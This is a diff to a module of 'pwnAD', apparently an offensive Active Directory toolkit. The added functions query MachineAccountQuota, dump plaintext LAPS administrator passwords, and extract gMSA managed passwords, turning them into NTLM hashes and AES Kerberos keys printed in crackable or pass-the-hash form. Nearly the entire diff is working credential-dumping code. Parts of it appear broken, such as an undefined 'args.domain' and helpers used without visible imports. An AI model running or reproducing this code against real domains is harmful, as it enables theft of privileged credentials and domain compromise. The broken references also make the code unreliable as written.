@@ -1,13 +1,16 @@
 from impacket.ldap import ldaptypes
+from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
 from ldap3.protocol.microsoft import security_descriptor_control
 from ldap3.protocol.formatters.formatters import format_sid
 from ldap3.utils.conv import escape_filter_chars
-from ldap3 import BASE
+from ldap3 import BASE, SUBTREE
+from pyasn1.error import PyAsn1Error
 import ldap3
 import logging
 
 from pwnAD.lib.accesscontrol import *
-from pwnAD.lib.utils import format_list_results
+from pwnAD.lib.utils import format_list_results, check_error
+from pwnAD.lib.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 from pwnAD.commands.query import query
 
 
@@ -214,3 +217,89 @@ def owner(conn, target: str):
     conn._ldap_connection.search(conn._baseDN, '(objectSid=%s)' % current_owner_SID, attributes=['distinguishedName'])
     current_owner_distinguished_name = conn._ldap_connection.entries[0]
     logging.info("- distinguishedName: %s" % current_owner_distinguished_name['distinguishedName'])
+
+def machine_quota(conn):
+    conn.search(search_base=conn._baseDN, search_filter="(objectClass=*)", attributes=["ms-DS-MachineAccountQuota"])
+    try:
+        maq = conn._ldap_connection.entries[0]["ms-DS-MachineAccountQuota"]
+        logging.info(f"MachineAccountQuota: {maq}")
+    except PyAsn1Error:
+        logging.error("MachineAccountQuota: <not set>")
+
+def laps(conn):
+    try:
+        conn.search(search_base=conn._baseDN, search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))', attributes=["ms-Mcs-AdmPwd","SAMAccountname"])
+        results = conn._ldap_connection.entries
+        if results == []:
+            logging.info("No LAPS password have been found")
+        else :
+            logging.info("LAPS password(s) found :")
+            for result in results:
+                logging.info(f'{result["SAMAccountname"]} : {result["ms-MCS-AdmPwd"]}')
+    except Exception as e:
+        if e.args[0] == "invalid attribute type ms-Mcs-AdmPwd":
+            logging.error(("This domain does not have LAPS configured"))
+        else:
+            error_code = conn._ldap_connection.result['result']
+            check_error(conn, error_code, e)
+
+def gmsa(conn):
+    # code inspired from micahvandeusen's gMSADumper https://github.com/micahvandeusen/gMSADumper
+    if conn._do_tls == False:
+        logging.error("GMSA passwords can only be retrived through a secure connection.")
+        choice = input("Do you want to start a TLS connection ? y/N")
+        if choice.lower() == "y":
+            try:
+                conn.start_tls()
+            except Exception as e:
+                logging.error(f"An error occured while trying to start a TLS connection : {e}")
+        else:
+            return
+    
+    try :
+        conn.search(
+            search_base=conn._baseDN, 
+            search_filter='(&(ObjectClass=msDS-GroupManagedServiceAccount))', 
+            search_scope=SUBTREE, 
+            attributes=['sAMAccountName','msDS-ManagedPassword','msDS-GroupMSAMembership']
+            )
+
+        if len(conn._ldap_connection.entries) == 0:
+            logging.info('No gMSAs returned.')
+
+        for entry in conn._ldap_connection.entries:
+            sam = entry['sAMAccountName'].value
+            logging.info(f'Users or groups who can read password for {sam}:')
+            for dacl in SR_SECURITY_DESCRIPTOR(data=entry['msDS-GroupMSAMembership'].raw_values[0])['Dacl']['Data']:
+                conn.search(conn._baseDN, '(&(objectSID='+dacl['Ace']['Sid'].formatCanonical()+'))', attributes=['sAMAccountName'])
+                
+                # Added this check to prevent an error from occuring when there are no results returned
+                if len(conn._ldap_connection.entries) != 0:
+                    logging.info(conn._ldap_connection.entries[0]['sAMAccountName'].value)
+
+            if 'msDS-ManagedPassword' in entry and entry['msDS-ManagedPassword']:
+                data = entry['msDS-ManagedPassword'].raw_values[0]
+                blob = MSDS_MANAGEDPASSWORD_BLOB()
+                blob.fromString(data)
+                currentPassword = blob['CurrentPassword'][:-2]
+
+                # Compute ntlm key
+                ntlm_hash = MD4.new ()
+                ntlm_hash.update (currentPassword)
+                passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
+                userpass = sam + ':::' + passwd
+                logging.info(userpass)
+
+                # Compute aes keys
+                password = currentPassword.decode('utf-16-le', 'replace').encode('utf-8')
+                salt = '%shost%s.%s' % (args.domain.upper(), sam[:-1].lower(), args.domain.lower())
+                aes_128_hash = hexlify(string_to_key(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, password, salt).contents)
+                aes_256_hash = hexlify(string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt).contents)
+                logging.info('%s:aes256-cts-hmac-sha1-96:%s' % (sam, aes_256_hash.decode('utf-8')))
+                logging.info('%s:aes128-cts-hmac-sha1-96:%s' % (sam, aes_128_hash.decode('utf-8')))
+
+    except Exception as e:
+        logging.error(f"An error occured while trying to retreive GMSA passwords : {e}")
+
+
+    
